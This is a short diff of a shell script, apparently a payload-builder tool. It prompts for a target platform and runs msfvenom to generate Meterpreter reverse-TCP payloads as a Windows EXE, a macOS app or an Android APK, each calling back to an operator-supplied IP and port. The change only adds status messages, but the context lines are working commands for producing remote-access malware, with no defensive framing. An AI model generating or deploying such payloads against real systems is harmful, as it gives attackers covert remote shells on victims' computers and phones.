@@ -20,14 +20,17 @@ echo "\033[1;33m:::: Type "m" for MACOSX(.app)\033[0m"
 echo "\033[1;33m:::: Type "a" for ANDROID(.apk)\033[0m"
 read payload_choice
 if [ $payload_choice = "w" ]; then
+	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > ~/msf/temp/$FILE.exe
 	echo "\033[1;34m::::You choose Windows EXE format::::\033[0m"
 fi
 if [ $payload_choice = "m" ]; then
+	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > ~/msf/temp/$FILE.app
 	echo "\033[1;34m::::You choose MacOSX APP format::::\033[0m"
 fi
 if [ $payload_choice = "a" ]; then
+	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > ~/msf/temp/$FILE.apk
 	echo "\033[1;34m::::You choose Android APK Format::::\033[0m"
 fi
